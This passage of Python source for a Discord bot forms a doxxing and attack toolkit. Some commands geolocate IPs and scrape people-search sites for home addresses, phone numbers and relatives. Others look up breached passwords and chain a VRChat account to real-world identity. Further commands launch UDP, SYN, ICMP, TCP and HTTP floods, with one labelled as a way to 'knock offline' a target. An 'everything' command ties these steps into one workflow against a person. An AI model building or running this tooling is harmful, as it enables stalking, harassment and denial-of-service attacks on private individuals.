    F(e,"Location",f"{d.get('city','?')}, {d.get('regionName','?')}, {d.get('country','?')}"); F(e,"ZIP",d.get("zip","?")); F(e,"ISP",d.get("isp","?")); F(e,"ASN",d.get("as","?"),False); F(e,"Coords",f"{d.get('lat','?')},{d.get('lon','?')}"); F(e,"rDNS",d.get("rdns","?")); F(e,"Flags",f"mobile={d.get('mobile')} vpn={d.get('proxy')} dc={d.get('hosting')}",False)
    if d.get("lat"): F(e,"Map",f"https://maps.google.com/?q={d['lat']},{d['lon']}",False)
    await i.followup.send(embed=e)
@bot.tree.command(name="geo",description="Coords.")
async def geoc(i:discord.Interaction,ip:str):
    d=await ip_lookup(ip); await i.response.send_message(f"`{ip}` {d.get('city','?')}, {d.get('country','?')} | https://maps.google.com/?q={d.get('lat','?')},{d.get('lon','?')}")
@bot.tree.command(name="asn",description="ASN.")
async def asnc(i:discord.Interaction,ip:str):
    d=await ip_lookup(ip); await i.response.send_message(f"`{ip}` ASN `{d.get('as','?')}` {d.get('org','?')}")
@bot.tree.command(name="leak",description="VPN leak check.")
async def leakc(i:discord.Interaction,ip:str):
    d=await ip_lookup(ip); v=[]
    if d.get("proxy"): v.append("VPN/proxy")
    if d.get("hosting"): v.append("datacenter")
    if d.get("mobile"): v.append("mobile/CGNAT")
    if not v: v.append("residential (likely real)")
    await i.response.send_message(f"`{ip}` {', '.join(v)} | isp {d.get('isp','?')}")
@bot.tree.command(name="vpn",description="Is this a VPN?")
async def vpnc(i:discord.Interaction,ip:str):
    d=await ip_lookup(ip); hiding=d.get("proxy") or d.get("hosting")
    e=E(f"// VPN CHECK {ip}",c=0xff006e)
    F(e,"Verdict","HIDING behind VPN/proxy" if hiding else "Not hiding — residential"); F(e,"ISP",d.get("isp","?")); F(e,"Type","datacenter" if d.get("hosting") else "residential")
    F(e,"Real IP?","Run /grab — WebRTC reveals real IP; v6 catches IPv4-only VPNs.",False); await i.response.send_message(embed=e)
@bot.tree.command(name="ports",description="Scan ports.")
async def portsc(i:discord.Interaction,ip:str,range:str=""):
    await i.response.defer(); pr=PORTS
    if range and "-" in range:
        a,b=range.split("-"); pr=list(range(int(a),int(b)+1))[:1000]
    f=await scan(ip,pr); await i.followup.send(f"`{ip}` open: {', '.join(map(str,f)) or 'none'}")
@bot.tree.command(name="trace",description="Ping.")
async def tracec(i:discord.Interaction,ip:str):
    await i.response.defer(); await i.followup.send(f"```{(await ping(ip))[-1300:]}```")
@bot.tree.command(name="traceroute",description="Hops.")
async def trc(i:discord.Interaction,ip:str):
    await i.response.defer(); await i.followup.send(f"```{(await traceroute(ip))[-1500:]}```")
@bot.tree.command(name="banner",description="Banner.")
async def bannerc(i:discord.Interaction,ip:str,port:int=80): await i.response.send_message(f"```{await banner(ip,port)}```")
@bot.tree.command(name="whois",description="WHOIS.")
async def whoisc(i:discord.Interaction,target:str):
    await i.response.defer(); await i.followup.send(f"```{await whois_lk(target)}```")
@bot.tree.command(name="dns",description="DNS.")
async def dnsc(i:discord.Interaction,domain:str):
    await i.response.defer(); parts=[]
    for t in ("A","AAAA","MX","TXT","NS","CNAME"):
        r=await rdns(domain,t)
        if r: parts.append(f"{t}: "+", ".join(r[:5]))
    await i.followup.send(f"```{chr(10).join(parts) or 'none'}```")
@bot.tree.command(name="ssl",description="SSL cert.")
async def sslc(i:discord.Interaction,host:str,port:int=443):
    await i.response.defer(); c=ssl_info(host,port); e=E(f"// SSL {host}")
    F(e,"Subject",c.get("subject")); F(e,"Issuer",c.get("issuer")); F(e,"Expires",c.get("notAfter")); F(e,"SANs",", ".join(s[1] for s in c.get("subjectAltName",[])[:15]),False); await i.followup.send(embed=e)
@bot.tree.command(name="subs",description="Subdomains.")
async def subsc(i:discord.Interaction,domain:str):
    await i.response.defer()
    async with aiohttp.ClientSession() as s: d=await gjson(s,f"https://crt.sh/?q=%25.{domain}&output=json")
    if not d: return await i.followup.send("none")
    await i.followup.send(f"```{chr(10).join(sorted({e['name_value'] for e in d})[:60])}```")
@bot.tree.command(name="headers",description="HTTP headers.")
async def headersc(i:discord.Interaction,url:str):
    await i.response.defer()
    if not url.startswith("http"): url="http://"+url
    async with aiohttp.ClientSession(headers={"User-Agent":UA}) as s:
        try:
            async with s.get(url,timeout=aiohttp.ClientTimeout(total=10)) as r: await i.followup.send(f"**{r.status}**\n```{chr(10).join(f'{k}: {v}' for k,v in r.headers.items())[:1500]}```")
        except Exception as e: await i.followup.send(str(e))
@bot.tree.command(name="ipcalc",description="CIDR.")
async def ipcalcc(i:discord.Interaction,cidr:str):
    n=ipaddress.ip_network(cidr,strict=False); await i.response.send_message(f"net {n.network_address}\nbcast {n.broadcast_address}\nmask {n.netmask}\nhosts {n.num_addresses}")
@bot.tree.command(name="mac",description="MAC vendor.")
async def macc(i:discord.Interaction,mac:str):
    async with aiohttp.ClientSession() as s: d=await gjson(s,f"https://api.macvendors.com/{mac}")
    await i.response.send_message(f"`{mac}` -> {d if isinstance(d,str) else 'unknown'}")

@bot.tree.command(name="username",description="Username hunt.")
async def userc(i:discord.Interaction,name:str):
    await i.response.defer(); f=await enum_user(name)
    if not f: return await i.followup.send(f"No hits `{name}`.")
    e=E(f"// {name}",c=0x00ff9d)
    for n,u in f: F(e,n,u,False)
    await i.followup.send(embed=e)
@bot.tree.command(name="email",description="Email intel.")
async def emailc(i:discord.Interaction,address:str):
    await i.response.defer(); d=await email_intel(address); e=E(f"// {address}",c=0x00ff9d)
    F(e,"MX",", ".join(d["mx"][:4]) or "none",False); F(e,"Gravatar",f"exists {d.get('gravatar_exists')}",False)
    if "breaches" in d: F(e,"Breaches",", ".join(d["breaches"]) or "none",False)
    if d.get("rep"): F(e,"Rep",f"{d['rep'].get('reputation')} susp={d['rep'].get('suspicious')}",False)
    F(e,"Link",d["gravatar"],False); await i.followup.send(embed=e)
@bot.tree.command(name="breach",description="Breach lookup.")
async def breachc(i:discord.Interaction,email:str):
    await i.response.defer(); d=await email_intel(email); e=E(f"// BREACH {email}",c=0xff006e)
    F(e,"HIBP",", ".join(d.get("breaches",[])) or ("none" if "breaches" in d else "no key"),False)
    F(e,"Links",f"https://haveibeenpwned.com/account/{email}\nhttps://dehashed.com/search?query={email}",False); await i.followup.send(embed=e)
@bot.tree.command(name="phone",description="Phone intel.")
async def phonec(i:discord.Interaction,number:str):
    d=phone_intel(number); e=E(f"// {number}",c=0x00ff9d)
    for k,v in d.items(): F(e,k,v)
    await i.response.send_message(embed=e)
@bot.tree.command(name="exif",description="GPS from photo.")
async def exifc(i:discord.Interaction,image:discord.Attachment):
    await i.response.defer(); d=exif_intel(await image.read()); e=E("// EXIF",c=0x00ff9d)
    for k,v in d.items(): F(e,k,str(v)[:800],False)
    await i.followup.send(embed=e)
@bot.tree.command(name="face",description="Reverse image links.")
async def facec(i:discord.Interaction,image:discord.Attachment):
    await i.response.send_message("Upload to:\nhttps://lens.google.com\nhttps://yandex.com/images\nhttps://tineye.com\nhttps://pimeyes.com")

@bot.tree.command(name="people",description="Scrape people-search: address, phones, relatives.")
async def peoplec(i:discord.Interaction,name:str,citystatezip:str=""):
    await i.response.defer(); d=await people_search(name,citystatezip)
    e=E(f"// PEOPLE: {name}",c=0x00ff9d)
    if d["results"]:
        F(e,"Matches","\n".join(r["name"] for r in d["results"][:5]),False)
    if d.get("addresses"): F(e,"Addresses (results)",", ".join(d["addresses"][:5]),False)
    det=d.get("detail",{})
    if det.get("address"): F(e,"ADDRESS (top match)",", ".join(det["address"]),False)
    if det.get("phones"): F(e,"PHONES",", ".join(det["phones"]),False)
    if det.get("relatives"): F(e,"RELATIVES",", ".join(det["relatives"]),False)
    if not d["results"]: F(e,"Note","No scrape hit — try adding city: `/people John Smith Buffalo NY`",False)
    F(e,"Links",f"https://truepeoplesearch.com/results?name={quote(name)}\nhttps://www.fastpeoplesearch.com/name/{name.replace(' ','-')}",False)
    await i.followup.send(embed=e)
@bot.tree.command(name="relatives",description="Relatives via people-search.")
async def relc(i:discord.Interaction,name:str):
    await i.response.defer(); d=await people_search(name)
    e=E(f"// RELATIVES: {name}",c=0x00ff9d)
    det=d.get("detail",{})
    if det.get("relatives"): F(e,"Relatives",", ".join(det["relatives"]),False)
    else: F(e,"Relatives","none scraped — try `/people {name} city state`",False)
    if det.get("address"): F(e,"Address",", ".join(det["address"]),False)
    await i.followup.send(embed=e)

@bot.tree.command(name="discord",description="Discord user by ID.")
async def discordc(i:discord.Interaction,user_id:str):
    await i.response.defer()
    try: u=await bot.fetch_user(int(user_id))
    except: return await i.followup.send("Bad ID.")
    e=E(f"// {u}"); F(e,"ID",u.id,False); F(e,"Created",snow(u.id).strftime("%Y-%m-%d %H:%M UTC"),False); F(e,"Badges",", ".join(n for b,n in FLAGS.items() if u.public_flags.value & b) or "none",False); F(e,"Avatar",u.display_avatar.url,False); await i.followup.send(embed=e)
@bot.tree.command(name="roblox",description="Roblox profile.")
async def robloxc(i:discord.Interaction,name:str):
    await i.response.defer(); d=await roblox_user(name)
    if not d: return await i.followup.send("Not found.")
    u=d["user"]; e=E(f"// {u.get('displayName')} (@{u.get('name')})",c=0x00a2ff)
    F(e,"ID",u.get("id"),False); F(e,"Created",u.get("created"),False); F(e,"About",(u.get("description") or "—")[:700],False)
    if d.get("history") and d["history"].get("data"): F(e,"Past names",", ".join(h["name"] for h in d["history"]["data"]),False)
    if d.get("birthday"): F(e,"Birthday",d["birthday"].get("birthday"),False)
    if d.get("friends"): F(e,"Friends",d["friends"].get("count"))
    if d.get("followers"): F(e,"Followers",d["followers"].get("count"))
    if d.get("presence") and d["presence"].get("userPresences"):
        p=d["presence"]["userPresences"][0]; F(e,"Presence",["offline","online","in game","in studio"][p.get("userPresenceType",0)],False)
        if p.get("lastLocation"): F(e,"Last game",p["lastLocation"],False)
    if d.get("groups") and d["groups"].get("data"): F(e,"Groups",", ".join(g["group"]["name"] for g in d["groups"]["data"][:8]),False)
    e.set_thumbnail(url=f"https://www.roblox.com/headshot-thumbnail/image?userId={d['id']}&width=150&height=150&format=png"); await i.followup.send(embed=e)
@bot.tree.command(name="ig",description="Instagram.")
async def igc(i:discord.Interaction,name:str):
    await i.response.defer(); d=await ig(name); e=E(f"// IG {name}",c=0xe1306c)
    for k,v in d.items(): F(e,k,v,False)
    await i.followup.send(embed=e)
@bot.tree.command(name="twitter",description="Twitter/X.")
async def twc(i:discord.Interaction,name:str):
    await i.response.defer(); d=await twitter(name); e=E(f"// X {name}",c=0x1da1f2)
    if isinstance(d,dict):
        for k,v in d.items(): F(e,k,v,False)
    await i.followup.send(embed=e)
@bot.tree.command(name="tiktok",description="TikTok.")
async def ttc(i:discord.Interaction,name:str):
    await i.response.defer(); d=await tiktok(name); e=E(f"// TikTok {name}",c=0xff0050)
    for k,v in d.items(): F(e,k,v,False)
    await i.followup.send(embed=e)
@bot.tree.command(name="vrchat_login",description="VRChat login.")
async def vrl(i:discord.Interaction,username:str,password:str):
    await i.response.defer(); r=await vr.login(username,password)
    await i.followup.send("2FA needed `/vrchat_2fa`" if r.get("twofa") else (f"Logged in {r.get('name')}" if r.get("ok") else "Failed."))
@bot.tree.command(name="vrchat_2fa",description="2FA.")
async def vr2(i:discord.Interaction,code:str):
    await i.response.defer(); r=await vr.tfa(code); await i.followup.send(f"OK {r.get('name')}" if r.get("ok") else "Failed.")
@bot.tree.command(name="vrc_user",description="VRChat profile.")
async def vru(i:discord.Interaction,query:str):
    await i.response.defer()
    u=await vr.u(query) if query.startswith("usr_") else (lambda r:(r[0] if isinstance(r,list) and r else r))(await vr.su(query))
    if not u or not u.get("id"): return await i.followup.send("Not found.")
    e=E(f"// {u.get('displayName')}",c=0x9d4edd); F(e,"ID",u.get("id"),False); F(e,"Bio",(u.get("bio") or "—")[:700],False); F(e,"Status",u.get("status")); F(e,"Tags",str(u.get("tags")),False); F(e,"Joined",u.get("date_joined"),False)
    if u.get("currentAvatarImageUrl"): e.set_thumbnail(url=u["currentAvatarImageUrl"])
    await i.followup.send(embed=e)
@bot.tree.command(name="vrc_search",description="VRChat search.")
async def vrs(i:discord.Interaction,query:str):
    await i.response.defer(); r=await vr.su(query)
    if not isinstance(r,list) or not r: return await i.followup.send("none")
    e=E(f"// {query}")
    for u in r[:8]: F(e,u.get("displayName"),u.get("id"),False)
    await i.followup.send(embed=e)
@bot.tree.command(name="vrc_world",description="World.")
async def vrw(i:discord.Interaction,world_id:str):
    await i.response.defer(); w=await vr.w(world_id)
    if not w.get("id"): return await i.followup.send("Not found.")
    e=E(f"// {w.get('name')}",c=0x9d4edd); F(e,"ID",w.get("id"),False); F(e,"Author",w.get("authorName")); F(e,"Capacity",w.get("capacity")); await i.followup.send(embed=e)
@bot.tree.command(name="vrc_friends",description="Friends.")
async def vrf(i:discord.Interaction,user_id:str):
    await i.response.defer(); f=await vr.fr(user_id)
    if not isinstance(f,list): return await i.followup.send("No data.")
    e=E(f"// FRIENDS {len(f)}")
    for u in f[:12]: F(e,u.get("displayName"),f"{u.get('id')} {u.get('status')}",False)
    await i.followup.send(embed=e)

# ---------------- CHAIN ----------------
def extract_ids(text, links=None):
    t=(text or "")+" "+" ".join(links or [])
    ids={"emails":set(),"urls":set(),"discord":set()}
    for e in re.findall(r"[\w.+-]+@[\w-]+\.[\w.-]+",t):
        if not e.lower().endswith((".png",".jpg",".gif")): ids["emails"].add(e.lower())
    for u in re.findall(r"https?://[^\s,)\]]+",t): ids["urls"].add(u.rstrip(".,)"))
    for d in re.findall(r"([\w.]{2,32})#\d{4}",t): ids["discord"].add(d)
    return ids
PLATFORM={"twitter.com":"twitter","x.com":"twitter","instagram.com":"ig","tiktok.com":"tiktok","youtu.be":"youtube","youtube.com":"youtube","twitch.tv":"twitch","github.com":"github","steamcommunity.com":"steam"}
async def handle_from_url(url):
    for dom,kind in PLATFORM.items():
        if dom in url:
            parts=[p for p in url.split("/") if p and "http" not in p]
            return kind,(parts[-1].split("?")[0] if parts else "")
    return None,None
async def chain(query):
    out=[f"########## CHAIN: {query} ##########",""]
    u=await vr.u(query) if query.startswith("usr_") else (lambda r:(r[0] if isinstance(r,list) and r else r))(await vr.su(query))
    if not u or not u.get("id"): return out+["[VRCHAT] not found."]
    uid=u["id"]; name=u.get("displayName","?")
    out.append(f"=== VRCHAT: {name} ({uid}) ===")
    out.append(f"joined {u.get('date_joined')} | trust {u.get('tags')} | status {u.get('status')}")
    if u.get("bio"): out.append(f"bio: {u['bio'][:500]}")
    if u.get("bioLinks"): out.append("bio links: "+" | ".join(u["bioLinks"]))
    out.append("")
    ids=extract_ids(u.get("bio"),u.get("bioLinks"))
    try:
        fr=await vr.fr(uid)
        if isinstance(fr,list) and fr:
            out.append(f"--- friends ({len(fr)}) ---"); out.append(", ".join(f.get("displayName","?") for f in fr[:25])); out.append("")
    except: pass
    for e in ids["emails"]:
        d=await email_intel(e); out.append(f"--- EMAIL {e} --- MX {', '.join(d['mx'][:3]) or 'none'} | gravatar {d.get('gravatar_exists')}")
        out.append(f"  https://haveibeenpwned.com/account/{e}\n  https://dehashed.com/search?query={e}\n")
    for url in list(ids["urls"])[:15]:
        m=await scrape_meta(url); out.append(f"--- LINK {url} ---")
        if m.get("og:title"): out.append(f"title: {m['og:title']}")
        k,h=await handle_from_url(url)
        if k and h: out.append(f"platform {k} handle {h}")
        out.append("")
    found=await enum_user(name)
    if found:
        out.append(f"--- USERNAME '{name}' on {len(found)} sites ---")
        for n,url2 in found: out.append(f"  {n}: {url2}")
        out.append("")
    ps=await people_search(name)
    if ps.get("detail",{}).get("address") or ps.get("detail",{}).get("relatives"):
        out.append("--- PEOPLE (scraped) ---")
        if ps["detail"].get("address"): out.append("address: "+", ".join(ps["detail"]["address"]))
        if ps["detail"].get("phones"): out.append("phones: "+", ".join(ps["detail"]["phones"]))
        if ps["detail"].get("relatives"): out.append("relatives: "+", ".join(ps["detail"]["relatives"]))
    return out
@bot.tree.command(name="chain",description="Seed a VRChat account -> walk every link.")
async def chainc(i:discord.Interaction,vrchat_user:str):
    await i.response.defer(); await slong(i.channel,"\n".join(await chain(vrchat_user)))

# ---------------- ATTACKS ----------------
@bot.tree.command(name="flood",description="UDP flood.")
async def floodc(i:discord.Interaction,ip:str,port:int=0,seconds:str="30",size:int=512):
    await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"UDP `{ip}:{port or '1-1024'}` {sec}s…")
    a=await run_flood(i.guild_id,"udp",ip,port,sec,size=size,workers=8); await i.channel.send(f"Done ~{a.packets:,} -> `{ip}`.")
@bot.tree.command(name="boot",description="Knock offline (hard UDP).")
async def bootc(i:discord.Interaction,ip:str,seconds:str="30"):
    await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"Booting `{ip}` {sec}s…")
    a=await run_flood(i.guild_id,"udp",ip,0,sec,size=512,workers=8); await i.channel.send(f"Done ~{a.packets:,} -> `{ip}`.")
@bot.tree.command(name="stress",description="Wide stress.")
async def stressc(i:discord.Interaction,ip:str,seconds:str="60"):
    await i.response.defer(); sec=pdur(seconds); await i.followup.send(f"Stressing `{ip}` {sec}s…")
    a=await run_flood(i.guild_id,"udp",ip,0,sec,size=1400,workers=8); await i.channel.send(f"Done ~{a.packets:,}.")
@bot.tree.command(name="syn",description="SYN flood (needs root).")
async def sync(i:discord.Interaction,ip:str,port:int=80,seconds:str="30"):
    await i.response.defer(); a=await run_flood(i.guild_id,"syn",ip,port,pdur(seconds)); await i.followup.send(f"Done ~{a.packets:,}."+(f" ({a.error})" if a.error else ""))
@bot.tree.command(name="icmp",description="ICMP flood (needs root).")
async def icmpc(i:discord.Interaction,ip:str,seconds:str="30"):
    await i.response.defer(); a=await run_flood(i.guild_id,"icmp",ip,0,pdur(seconds)); await i.followup.send(f"Done ~{a.packets:,}."+(f" ({a.error})" if a.error else ""))
@bot.tree.command(name="tcpflood",description="TCP flood.")
async def tcpc(i:discord.Interaction,ip:str,port:int=80,seconds:str="30"):
    await i.response.defer(); a=await run_flood(i.guild_id,"tcp",ip,port,pdur(seconds)); await i.followup.send(f"Done ~{a.packets:,}.")
@bot.tree.command(name="httpflood",description="HTTP flood.")
async def httpc(i:discord.Interaction,url:str,seconds:str="30"):
    await i.response.defer()
    if not url.startswith("http"): url="http://"+url
    a=await run_flood(i.guild_id,"http","",0,pdur(seconds),url=url); await i.followup.send(f"Done ~{a.packets:,}.")
@bot.tree.command(name="stop",description="Stop.")
async def stopc(i:discord.Interaction): await i.response.send_message("Stopped." if stop_flood(i.guild_id) else "Nothing.")

# ---------------- UTIL ----------------
@bot.tree.command(name="hash",description="Hash.")
async def hashc(i:discord.Interaction,text:str):
    await i.response.send_message(f"md5 `{hashlib.md5(text.encode()).hexdigest()}`\nsha1 `{hashlib.sha1(text.encode()).hexdigest()}`\nsha256 `{hashlib.sha256(text.encode()).hexdigest()}`")
@bot.tree.command(name="b64",description="Base64.")
async def b64c(i:discord.Interaction,text:str,decode:bool=False):
    try: r=base64.b64decode(text).decode() if decode else base64.b64encode(text.encode()).decode()
    except: r="bad"
    await i.response.send_message(f"```{r}```")
@bot.tree.command(name="uuid",description="UUID.")
async def uuidc(i:discord.Interaction): await i.response.send_message(str(uuidlib.uuid4()))
@bot.tree.command(name="calc",description="Math.")
async def calcc(i:discord.Interaction,expr:str):
    try: await i.response.send_message(f"`{eval(expr,{'__builtins__':{}},{'math':math})}`")
    except Exception as e: await i.response.send_message(str(e))
@bot.tree.command(name="userinfo",description="Member info.")
async def uinfo(i:discord.Interaction,member:discord.Member):
    e=E(f"// {member}"); F(e,"ID",member.id,False); F(e,"Created",snow(member.id).strftime("%Y-%m-%d"),False); F(e,"Joined",member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "?",False); F(e,"Roles",", ".join(r.name for r in member.roles[1:8]),False); await i.response.send_message(embed=e)
@bot.tree.command(name="serverinfo",description="Server info.")
async def sinfo(i:discord.Interaction):
    g=i.guild; e=E(f"// {g.name}"); F(e,"ID",g.id,False); F(e,"Owner",g.owner,False); F(e,"Members",g.member_count); F(e,"Created",g.created_at.strftime("%Y-%m-%d"),False); await i.response.send_message(embed=e)
@bot.tree.command(name="avatar",description="Avatar.")
async def avatar(i:discord.Interaction,member:discord.Member):
    e=E(f"// {member}"); e.set_image(url=member.display_avatar.url); await i.response.send_message(embed=e)

# ---------------- EVERYTHING ----------------
@bot.tree.command(name="everything",description="One command: give anything, get EVERYTHING.")
async def everything(i:discord.Interaction,query:str):
    await i.response.defer()
    L=[f"═══════ EVERYTHING: {query} ═══════",""]; conf=0
    if re.match(r"^\d{1,3}(\.\d{1,3}){3}$",query) or (":" in query and query.count(":")>=2):
        d=await ip_lookup(query)
        L+=[f"[IP] {query}",f"Location: {d.get('city')}, {d.get('regionName')}, {d.get('country')} {d.get('zip')}",f"ISP: {d.get('isp')} | Org: {d.get('org')}",f"ASN: {d.get('as')}",f"Coords: {d.get('lat')},{d.get('lon')} | TZ: {d.get('timezone')}",f"VPN: {'HIDING' if (d.get('proxy') or d.get('hosting')) else 'residential'}",f"rDNS: {d.get('rdns')}"]
        if d.get("lat"): L.append(f"Map: https://maps.google.com/?q={d['lat']},{d['lon']}")
        try:
            p=await scan(query); L.append(f"Open ports: {', '.join(map(str,p)) or 'none'}")
        except: pass
        L.append(""); conf+=1
    elif "@" in query and "." in query.split("@")[-1]:
        d=await email_intel(query)
        L+=[f"[EMAIL] {query}",f"MX: {', '.join(d['mx'][:4]) or 'none'}",f"Gravatar: {d.get('gravatar_exists')}",f"HIBP: https://haveibeenpwned.com/account/{query}",f"Dehashed: https://dehashed.com/search?query={query}",f"Snusbase: https://snusbase.com"]
        if d.get("breaches"): L.append(f"Breaches: {', '.join(d['breaches'])}")
        L.append(""); conf+=2
    elif re.match(r"^\+?\d{7,15}$",query):
        d=phone_intel(query); L.append(f"[PHONE] {query}")
        for k,v in d.items(): L.append(f"{k}: {v}")
        L.append(f"Reverse: https://www.truepeoplesearch.com/resultphone?phoneno={quote(query)}"); L.append(""); conf+=1
    else:
        try:
            u=await vr.u(query) if query.startswith("usr_") else (lambda r:(r[0] if isinstance(r,list) and r else r))(await vr.su(query))
            if u and u.get("id"):
                L+=[f"[VRCHAT] {u.get('displayName')} ({u.get('id')})",f"Joined: {u.get('date_joined')} | Trust: {u.get('tags')}",f"Bio: {(u.get('bio') or '')[:250]}"]
                if u.get("bioLinks"): L.append("Bio links: "+" | ".join(u["bioLinks"]))
                conf+=1
        except: pass
        rb=await roblox_user(query)
        if rb and rb.get("user"):
            x=rb["user"]; L+=[f"[ROBLOX] {x.get('displayName')} (@{x.get('name')}) id {x.get('id')}",f"Created: {x.get('created')}"]
            if rb.get("history") and rb["history"].get("data"): L.append("Past names: "+", ".join(h["name"] for h in rb["history"]["data"]))
            conf+=1
        f=await enum_user(query)
        if f:
            L.append(f"[USERNAME] found on {len(f)} sites:")
            for n,u2 in f: L.append(f"  {n}: {u2}")
            conf+=1
        ps=await people_search(query)
        if ps.get("detail") or ps.get("results"):
            L.append("")
            L.append("── PEOPLE (scraped) ──")
            if ps.get("results"): L.append("Matches: "+", ".join(r["name"] for r in ps["results"][:4]))
            if ps.get("detail",{}).get("address"): L.append("ADDRESS: "+", ".join(ps["detail"]["address"])); conf+=1
            if ps.get("detail",{}).get("phones"): L.append("PHONES: "+", ".join(ps["detail"]["phones"]))
            if ps.get("detail",{}).get("relatives"): L.append("RELATIVES: "+", ".join(ps["detail"]["relatives"])); conf+=1
    L+=["","── LINKS ──",f"https://truepeoplesearch.com/results?name={quote(query)}",f"https://thatsthem.com/name/{quote(query)}","","── NEXT ──","• /grab -> link -> IP -> /lookup","• email -> /breach -> Dehashed = passwords","• /boot <ip> -> knock offline","",f"CONFIDENCE: {min(conf*22,95)}% ({conf} layers)"]
    await slong(i.channel,"\n".join(L))

@bot.event
async def setup_hook():
    asyncio.create_task(start_web())
    if GUILD_ID:
        g=discord.Object(id=GUILD_ID); bot.tree.copy_global_to(guild=g); await bot.tree.sync(guild=g)
    else: await bot.tree.sync()
@bot.event
async def on_ready(): print(f"[bot] online {bot.user}")
if __name__=="__main__": bot.run(TOKEN)
